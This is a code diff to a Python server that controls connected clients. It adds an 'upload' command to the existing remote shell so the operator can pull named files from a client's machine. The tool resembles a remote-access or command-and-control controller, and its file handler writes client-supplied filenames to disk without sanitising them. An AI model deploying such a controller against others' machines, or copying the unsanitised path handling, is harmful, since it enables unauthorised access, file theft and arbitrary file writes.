@@ -10,6 +10,7 @@ import itertools
 import math
 import subprocess
 import requests
+import base64
 from Function_Net.sending import files_to_base64, base64_to_file, files_to_base64_archive, base64_archive_to_files, selecting_files
 from Function_Net.recieving import receive_and_decompress_file, receive_multiple_files, receive_file_simple
 from tkinter import Tk, filedialog
@@ -277,6 +278,58 @@ def handle_client(conn, addr):
                                     clients[addr]["cwd"] = cwd
                                     clients[addr]["cmd_event"].set()
                                     clients[addr]["cmd_output"] = output
+                        
+                        elif msg_type == "FILE_UPLOAD":
+                            # Handle file upload from client
+                            filename = msg.get("filename")
+                            file_data_b64 = msg.get("data")
+                            success = msg.get("success", True)
+                            error = msg.get("error", None)
+                            
+                            if success and file_data_b64:
+                                try:
+                                    # Create uploads directory if it doesn't exist
+                                    upload_dir = os.path.join("logs", "uploads")
+                                    os.makedirs(upload_dir, exist_ok=True)
+                                    
+                                    # Decode and save file
+                                    file_data = base64.b64decode(file_data_b64)
+                                    save_path = os.path.join(upload_dir, filename)
+                                    
+                                    # Handle duplicate filenames
+                                    base, ext = os.path.splitext(filename)
+                                    counter = 1
+                                    while os.path.exists(save_path):
+                                        save_path = os.path.join(upload_dir, f"{base}_{counter}{ext}")
+                                        counter += 1
+                                    
+                                    with open(save_path, "wb") as f:
+                                        f.write(file_data)
+                                    
+                                    with clients_lock:
+                                        if addr in clients:
+                                            clients[addr]["file_upload_status"] = "success"
+                                            clients[addr]["uploaded_file_path"] = save_path
+                                            clients[addr]["cmd_event"].set()
+                                    
+                                    print(f"\n{GREEN}[✓] File uploaded from {client_name}: {filename} -> {save_path}{RESET}")
+                                    print(f"{RED}Server> {RESET}", end="", flush=True)
+                                except Exception as e:
+                                    with clients_lock:
+                                        if addr in clients:
+                                            clients[addr]["file_upload_status"] = "failed"
+                                            clients[addr]["file_upload_error"] = str(e)
+                                            clients[addr]["cmd_event"].set()
+                                    print(f"\n{RED}[ERROR] Failed to save uploaded file: {e}{RESET}")
+                                    print(f"{RED}Server> {RESET}", end="", flush=True)
+                            else:
+                                with clients_lock:
+                                    if addr in clients:
+                                        clients[addr]["file_upload_status"] = "failed"
+                                        clients[addr]["file_upload_error"] = error or "Unknown error"
+                                        clients[addr]["cmd_event"].set()
+                                print(f"\n{RED}[ERROR] Client reported upload error: {error}{RESET}")
+                                print(f"{RED}Server> {RESET}", end="", flush=True)
                     
                     except json.JSONDecodeError:
                         pass
@@ -524,6 +577,8 @@ def PrintBanner():
     print("  │   send file         - Send file to all connected clients                │")
     print("  │   send file <ip>    - Send file to a specific client                    │")
     print("  │   cmd <ip>          - Open remote shell on specific client              │")
+    print("  │                     → Type 'upload <filename>' to request file from      │")
+    print("  │                       client while in remote shell                       │")
     print("  │   disconnect <ip>   - Disconnect specific client                        │")
     print("  │   disconnect all    - Disconnect all clients                            │")
     print("  │                                                                         │")
@@ -790,6 +845,7 @@ def cmd_shell(target_ip):
 
     print(f"\n{GREEN}Connected to {target_ip}. Entering remote shell...{RESET}")
     print(f"{YELLOW}Type 'exit' to return to server menu.{RESET}")
+    print(f"{YELLOW}Type 'upload <filename>' to request a file from the client.{RESET}")
     
     conn = target_client["conn"]
     cmd_event = target_client["cmd_event"]
@@ -804,6 +860,41 @@ def cmd_shell(target_ip):
                 break
             
             if not command:
+                continue
+            
+            # Check for upload command
+            if command.lower().startswith("upload "):
+                filename = command[7:].strip()
+                if not filename:
+                    print(f"{RED}Please specify a filename to upload.{RESET}")
+                    continue
+                
+                # Request file from client
+                print(f"{YELLOW}[*] Requesting file '{filename}' from client...{RESET}")
+                msg = json.dumps({"type": "FILE_UPLOAD_REQUEST", "filename": filename})
+                if not send_message(conn, msg):
+                    print(f"{RED}Failed to send upload request. Connection might be lost.{RESET}")
+                    break
+                
+                # Wait for file upload (longer timeout for file transfer)
+                print(f"{YELLOW}[*] Waiting for file transfer...{RESET}")
+                if cmd_event.wait(timeout=60):
+                    with clients_lock:
+                        if "file_upload_status" in clients[target_addr]:
+                            status = clients[target_addr]["file_upload_status"]
+                            if status == "success":
+                                saved_path = clients[target_addr].get("uploaded_file_path", "unknown")
+                                print(f"{GREEN}✓ File uploaded successfully!{RESET}")
+                                print(f"{GREEN}  Saved to: {saved_path}{RESET}")
+                            else:
+                                error = clients[target_addr].get("file_upload_error", "Unknown error")
+                                print(f"{RED}✗ Upload failed: {error}{RESET}")
+                            # Clear the status
+                            del clients[target_addr]["file_upload_status"]
+                        else:
+                            print(f"{RED}Unexpected response from client.{RESET}")
+                else:
+                    print(f"{RED}Timeout waiting for file upload.{RESET}")
                 continue
                 
             # Clear event before sending
